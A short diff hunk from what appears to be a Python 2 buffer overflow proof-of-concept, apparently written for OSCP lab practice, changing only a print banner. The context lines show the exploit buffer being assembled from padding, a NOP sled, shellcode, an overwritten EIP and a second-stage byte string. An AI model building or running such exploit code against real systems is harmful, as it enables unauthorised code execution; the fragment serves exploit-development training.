@@ -66,7 +66,7 @@ secstage = "\x81\xc4\x90\xfe\xff\xff\xff\xe4"
 ## build the buffer string
 thebuff = buff + nopsled + shellcode + eip + secstage
 
-print "[*] VulnApp2 Buffer Overflow POC OSCP.."
+print "[*] Vuln2 Buffer Overflow PoC.." 
 print "[*] Length of buffer: " + str(len(thebuff))
 print "[*] Length of Buff: " + str(len(buff))
 print "[*] Size of Nopsled: " + str(len(nopsled))
